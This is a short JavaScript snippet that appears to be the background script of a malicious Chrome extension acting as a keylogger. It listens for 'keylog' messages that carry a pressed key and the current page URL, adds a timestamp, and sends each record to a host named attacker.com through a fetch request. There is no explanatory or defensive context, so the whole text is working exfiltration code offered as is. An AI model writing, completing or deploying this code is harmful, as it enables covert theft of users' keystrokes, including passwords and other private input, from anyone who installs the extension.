chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "keylog") {
    const data = {
      key: message.key,
      url: message.url,
      timestamp: new Date().toISOString()
    };

    fetch("https://attacker.com/keylog?data=" + encodeURIComponent(JSON.stringify(data)))
      .then(response => console.log("Sent key:", message.key))
      .catch(error => console.error("Error sending key:", error));
  }
});
